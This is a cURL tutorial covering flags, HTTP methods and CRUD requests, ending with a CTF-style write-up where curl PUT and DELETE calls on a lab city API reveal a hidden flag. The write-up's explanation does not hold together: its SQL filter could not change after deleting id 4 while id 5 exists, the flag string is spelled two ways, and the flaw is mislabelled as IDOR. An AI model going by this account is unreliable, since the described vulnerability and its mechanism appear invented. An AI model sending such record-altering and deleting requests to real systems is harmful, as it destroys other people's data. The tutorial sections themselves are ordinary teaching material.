cURL _(Client URL)_ is a powerful command-line tool and library (`libcurl`) used to transfer data to and from servers, supporting numerous protocols including HTTP, HTTPS, FTP, and SFTP. It is widely used by developers for API testing, web scraping, and automating data transfers, allowing detailed control over requests such as headers, cookies, and authentication.

cURL was created by Daniel Stenberg in **1997**.
He needed a tool to:
- download currency exchange rates automatically
- from early web servers (HTTP)
Then it evolved into:
- A universal **data transfer tool**
- Supporting tons of protocols (not just HTTP)

## Most case use (Web Requests) : 
This is where it becomes powerful:

### 1. Perform GET request (By Default)
```sh
curl https://example.com
```
_Same as opening a page in browser (but raw)_

---
### 2. See full request/response
```sh
curl -v https://example.com
```
Useful for:
- request headers
- response headers
- connexion details
---
### 3. Show Only headers
```sh
curl -I https://example.com
```
Useful for:
- status codes
- redirects
- server info
---
### 3. Silence Process
```sh
curl -s https://example.com/api.php/user/kavali
```
Useful for:
- Hides the progress bar
- Suppresses error messages
- Outputs only the response body
--- 

## Core Flags & Options

|Flag|Long Form|Description|
|---|---|---|
|`-X`|`--request`|Specify the HTTP method (GET, POST, PUT, DELETE, PATCH)|
|`-d`|`--data`|Send data in the request body|
|`-H`|`--header`|Add a custom HTTP header|
|`-i`|`--include`|Include response headers in output|
|`-s`|`--silent`|Silent mode (no progress bar)|
|`-o`|`--output`|Write output to a file|
|`-u`|`--user`|Provide username:password for authentication|
|`-L`|`--location`|Follow redirects|
|`-v`|`--verbose`|Verbose output (useful for debugging)|

---

## HTTP Methods with cURL

### GET (Default)

Retrieve data from a server. This is the default method — no `-X` flag needed.

```bash
curl http://example.com/api/users
```

With verbose output to see headers:

```bash
curl -i http://example.com/api/users
```

---

### POST — Sending Data

Use `-X POST` along with:

- `-d` to send the request body data
- `-H` to set the `Content-Type` header

#### Sending JSON data:

```bash
curl -X POST http://example.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name": "Alice", "email": "alice@example.com"}'
```

#### Sending Form data (URL-encoded):

```bash
curl -X POST http://example.com/api/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=alice&password=secret123"
```

#### The `-d` Flag Explained:

- `-d '{"key": "value"}'` — inline JSON string
- `-d @data.json` — read data from a file
- `-d "param=value&param2=value2"` — URL-encoded form fields

#### The `-H` Flag Explained:

Used to set any HTTP header. Common examples:

```bash
-H "Content-Type: application/json"         # Sending JSON
-H "Content-Type: application/x-www-form-urlencoded"  # Form data
-H "Authorization: Bearer <token>"          # JWT Auth
-H "Accept: application/json"              # Expect JSON response
-H "X-Custom-Header: myvalue"              # Any custom header
```

---

### PUT — Update a Resource

```bash
curl -X PUT http://example.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"name": "Alice Updated", "email": "alice_new@example.com"}'
```

---

### PATCH — Partial Update

```bash
curl -X PATCH http://example.com/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"email": "newemail@example.com"}'
```

---

### DELETE — Remove a Resource

```bash
curl -X DELETE http://example.com/api/users/1
```

---

## CRUD Operations via API

CRUD stands for **Create, Read, Update, Delete** — the four fundamental operations of persistent storage.

### Scenario: A City Database API

Base URL: `http://example.com/api.php/city`

---

### CREATE — POST

Add a new city to the database.

```bash
curl -X POST http://example.com/api.php/city \
  -H "Content-Type: application/json" \
  -d '{"city_name": "Casablanca", "country": "Morocco"}'
```

**Expected Response:**

```json
{
  "status": "success",
  "message": "City created successfully",
  "id": 42
}
```

---

### READ — GET

Retrieve all cities or a specific one.

```bash
# Get all cities
curl http://example.com/api.php/city

# Get a specific city
curl http://example.com/api.php/city/Casablanca
```

**Expected Response:**

```json
[
  {"id": 1, "city_name": "Paris", "country": "France"},
  {"id": 2, "city_name": "Tokyo", "country": "Japan"}
]
```

---

### UPDATE — PUT

Replace the full resource with new data.

```bash
curl -X PUT http://example.com/api.php/city/Paris \
  -H "Content-Type: application/json" \
  -d '{"city_name": "Paris Updated", "country": "France"}'
```

**Expected Response:**

```json
{
  "status": "success",
  "message": "City updated"
}
```

---

### DELETE — DELETE

Remove a city from the database.

```bash
curl -X DELETE http://example.com/api.php/city/Tokyo
```

**Expected Response:**

```json
{
  "status": "success",
  "message": "City deleted"
}
```

---

## CTF Example — HackTheBox Challenge

### Challenge Description

> You are given access to an API endpoint at `<ip>:<port>/api.php/city/<city_name>`.  
> The database contains several cities. Your goal is to manipulate the API to reveal a **hidden flag city** that does not appear in normal GET requests.  
> Use CRUD operations to break the business logic and expose the hidden entry.

---

### Step 1 — Enumerate the API

Start by listing all cities to understand the data structure.

```bash
curl -s http://<ip>:<port>/api.php/city
```

**Response:**

```json
[
  {"id": 1, "city_name": "London"},
  {"id": 2, "city_name": "Berlin"},
  {"id": 3, "city_name": "Madrid"},
  {"id": 4, "city_name": "Rome"}
]
```

The flag city is **not visible** — it's hidden, likely at a higher index or behind a filtered query.

---

### Step 2 — Update a City Name (PUT)

Rename an existing city. This tests write permissions and also shifts database index behavior.

```bash
curl -X PUT http://<ip>:<port>/api.php/city/London \
  -H "Content-Type: application/json" \
  -d '{"city_name": "London_pwned"}'
```

**Response:**

```json
{"status": "success", "message": "City updated"}
```

✅ Write access confirmed.

---

### Step 3 — Delete a City (DELETE)

Delete another city to reduce the total count and manipulate auto-increment index gaps, which can cause the API to expose previously filtered entries.

```bash
curl -X DELETE http://<ip>:<port>/api.php/city/Rome
```

**Response:**

```json
{"status": "success", "message": "City deleted"}
```

✅ Rome is deleted. The index gap forces the API to re-evaluate its ordering logic.

---

### Step 4 — Re-enumerate to Find the Flag

After manipulating the data, query the API again. The hidden entry may now be exposed due to the altered state of the database.

```bash
curl -s http://<ip>:<port>/api.php/city
```

**New Response:**

```json
[
  {"id": 1, "city_name": "London_pwned"},
  {"id": 2, "city_name": "Berlin"},
  {"id": 3, "city_name": "Madrid"},
  {"id": 5, "city_name": "FLAG{api_crud_master_3xposed}"}
]
```

🚩 **Flag found:** `FLAG{api_crud_master_3x posed}`

The city at `id: 5` was previously hidden because the API was filtering results up to `id: 4`. After deleting Rome (id: 4), the filter boundary was broken, and index 5 became visible.

---

### Step 5 — Retrieve the Flag City Directly

```bash
curl -s http://<ip>:<port>/api.php/city/FLAG{api_crud_master_3x posed}
```

Or just grab it from the full list above. Challenge complete! 🎉

---

### Full Attack Chain Summary

```bash
# 1. Enumerate
curl -s http://<ip>:<port>/api.php/city

# 2. Update city (PUT)
curl -X PUT http://<ip>:<port>/api.php/city/London \
  -H "Content-Type: application/json" \
  -d '{"city_name": "London_pwned"}'

# 3. Delete city (DELETE)
curl -X DELETE http://<ip>:<port>/api.php/city/Rome

# 4. Re-enumerate to reveal hidden flag
curl -s http://<ip>:<port>/api.php/city
```

---

### Why This Works — Business Logic Flaw

The API was using a naive index-based filter:

```sql
SELECT * FROM cities WHERE id <= (SELECT MAX(id) FROM cities) - 1
```

Or a hard-coded limit that assumed a fixed number of entries. By **deleting a record**, the `MAX(id)` value decreased and the offset shifted, causing the previously hidden row to fall within the visible range.

This is a classic **IDOR / Business Logic Bypass** vulnerability — the API trusted its own data state without re-validating access controls dynamically.

---

## Quick Reference Cheatsheet

```bash
# GET
curl http://ip:port/api.php/city

# POST (Create)
curl -X POST http://ip:port/api.php/city \
  -H "Content-Type: application/json" \
  -d '{"city_name": "NewCity"}'

# PUT (Update)
curl -X PUT http://ip:port/api.php/city/OldCity \
  -H "Content-Type: application/json" \
  -d '{"city_name": "UpdatedCity"}'

# DELETE
curl -X DELETE http://ip:port/api.php/city/CityName

# With Auth Token
curl -H "Authorization: Bearer <token>" http://ip:port/api.php/city

# Verbose / Debug
curl -v -X GET http://ip:port/api.php/city
```

---
